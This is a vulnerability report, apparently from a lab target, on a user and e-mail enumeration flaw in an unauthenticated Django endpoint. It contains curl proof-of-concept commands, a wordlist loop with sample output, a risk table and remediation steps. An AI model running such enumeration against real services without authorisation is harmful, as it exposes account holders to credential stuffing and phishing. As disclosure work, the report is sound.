# Description

Username / e-mail enumeration (CWE-203 — Observable Discrepancy) via the unauthenticated boolean oracle `GET /api/check-user/?email=<candidate>`. The endpoint returns `{"exists": true|false}` based on whether an account matches, with **no authentication, rate-limiting, or CAPTCHA**. It matches against both usernames (`arthur`) and registered e-mails (`arthur@tbox.traced`), doubling the attack surface and letting an anonymous attacker enumerate the entire user base from a wordlist.

# Exploitation

A single GET reveals existence:

```
GET /api/check-user/?email=<candidate>
→ {"exists": true}   (exists)
→ {"exists": false}  (absent)
```

No cookie, no header, no anti-bot control — only network access is required.

# PoC

**1. Confirm the unauthenticated oracle:**

```bash
curl -i "http://<TARGET>/api/check-user/?email=arthur"
# HTTP/1.1 200 OK
# {"exists": true}
```

![Unauthenticated boolean oracle response](check-user-email-match.png)

**2. Drive it with a wordlist:**

```bash
for c in arthur admin johndoe nonexistent_xyz fake@example.com; do
  echo "$c → $(curl -s "http://<TARGET>/api/check-user/?email=$c")"
done
# arthur          → {"exists": true}
# admin           → {"exists": true}
# johndoe         → {"exists": true}
# nonexistent_xyz → {"exists": false}
```

![Bulk enumeration loop output](check-user-bulk-enumeration.png)

**3. Dual matching on username *and* e-mail:**

```bash
curl -s "http://<TARGET>/api/check-user/?email=admin@tbox.traced"   # {"exists": true}
```

![Oracle matches both username and registered e-mail](check-user-boolean-oracle-terminal.png)

# Risk

| Dimension | Impact |
|-----------|--------|
| Confidentiality | Confirms which usernames/e-mails are registered, including `admin`. |
| Integrity | Feeds credential-stuffing and targeted phishing (real e-mail list). |
| Availability | None directly. |

Overall severity: **Medium** — unauthenticated, machine-readable, no rate-limit; a strong precursor to account-takeover chains.

# Remediation

1. **Remove public account-existence disclosure** — remove unnecessary public account-existence checks. Perform required account validation internally within the legitimate registration and account recovery workflows.
2. **Enforce authentication and authorisation where required** — restrict any retained private account lookup functionality using Django's authentication and permission mechanisms. Only disclose account information to explicitly authorised callers.
3. **Return uniform responses** — ensure that public registration, login, password reset and verification workflows provide consistent response bodies, HTTP status codes and processing times without disclosing account existence.
4. **Implement abuse prevention controls** — enforce appropriate server-side rate limiting and introduce CAPTCHA or equivalent automated-abuse protections where justified. Maintain Django's CSRF protection independently for state-changing requests.
5. **Audit related authentication workflows** — review account registration, authentication, password recovery and verification functionality for inconsistent disclosure of sensitive account information.
6. **Add regression tests** — extend the relevant Django API and account tests to verify response consistency, access controls, account information confidentiality and rate-limiting enforcement.

# Author
Hackrapovic
